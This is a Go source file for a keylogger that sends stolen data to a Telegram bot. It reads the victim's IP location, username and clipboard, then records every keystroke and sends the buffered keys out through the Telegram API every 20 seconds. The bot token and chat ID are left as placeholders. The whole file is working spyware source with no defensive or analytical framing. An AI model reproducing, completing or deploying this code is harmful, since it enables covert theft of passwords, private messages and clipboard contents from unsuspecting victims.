package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"os/exec"
	"time"

	"github.com/atotto/clipboard"
	"github.com/eiannone/keyboard"
)

var logs string

const (
	botToken = "YOUR_BOT-Token"
	ChatID   = "YOUT_CHAT-ID"
)

func main() {
	sendM(localisation())
	version := system("whoami")
	sendM(version)
	sendM(StartClipboardMonitor())
	err := keyboard.Open() // ouvrir le clavier
	if err != nil {
		log.Fatal(err)
	}
	defer keyboard.Close()

	go func() {
		for {
			time.Sleep(20 * time.Second)
			if logs != "" {
				keyentr := fmt.Sprintf("[Keyboard Entries] %s", logs)
				sendM(keyentr)
				logs = ""
			}
		}
	}()

	for {
		char, _, err := keyboard.GetKey() // fonction principale
		if err != nil {
			log.Fatal(err)
		}
		logs += string(char)
	}
}

func sendM(message string) {
	apiURL := fmt.Sprintf(
		"https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
		botToken, ChatID, url.QueryEscape(message),
	)

	_, err := http.Get(apiURL)
	if err != nil {
		return
	}
}

func localisation() string {
	resp, err := http.Get("https://ipinfo.io/")
	if err != nil {
		log.Fatal(err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	return string(body)
}

func system(cmdstr string) string {
	cmd := exec.Command(cmdstr)
	out, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatal(err)
	}
	output := fmt.Sprintf("[whoami] %s", out)
	return string(output)
}

func StartClipboardMonitor() string {
	clipboard, err := clipboard.ReadAll()
	if err != nil {
		log.Fatal(err)
	}
	clip := fmt.Sprintf("[Clipboard] %s", clipboard)
	return string(clip)
}
